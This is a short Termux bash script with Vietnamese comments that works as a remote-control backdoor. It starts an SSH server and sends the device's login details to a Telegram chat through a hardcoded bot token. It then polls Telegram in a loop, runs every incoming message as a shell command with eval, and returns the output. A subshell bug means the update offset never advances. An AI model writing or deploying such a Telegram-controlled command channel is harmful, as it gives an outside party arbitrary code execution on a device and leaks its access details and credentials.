#!/data/data/com.termux/files/usr/bin/bash

# Cấu hình
SSH_PORT=8022
USERNAME="$(whoami)"
IP_ADDRESS=$(ip route get 1 | awk '{print $7; exit}')
BOT_TOKEN="7661043177:AAEL1xO9C1O4vMnr705gZvPPRMh5JN26VHk"
CHAT_ID="5197540151"

# Khởi động SSH nếu chưa chạy
if ! pgrep -x sshd >/dev/null; then
    echo "Đang khởi động sshd..."
    sshd
fi

# Gửi lệnh SSH vào Telegram
SSH_CMD="ssh -p $SSH_PORT $USERNAME@$IP_ADDRESS"
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text="$SSH_CMD"

# Nhận lệnh từ Telegram bot và thực thi
LAST_UPDATE_ID=0
while true; do
    RESPONSE=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID + 1))")
    echo "$RESPONSE" | jq -c '.result[]' | while read -r update; do
        UPDATE_ID=$(echo "$update" | jq -r '.update_id')
        MESSAGE=$(echo "$update" | jq -r '.message.text')

        # Cập nhật ID cuối cùng
        LAST_UPDATE_ID=$UPDATE_ID

        # Bỏ qua tin không phải lệnh
        [ -z "$MESSAGE" ] && continue

        # Thực thi lệnh
        RESULT=$(eval "$MESSAGE" 2>&1)

        # Gửi kết quả về Telegram
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" \
            -d text="Kết quả:\n$RESULT"
    done
    sleep 2
done
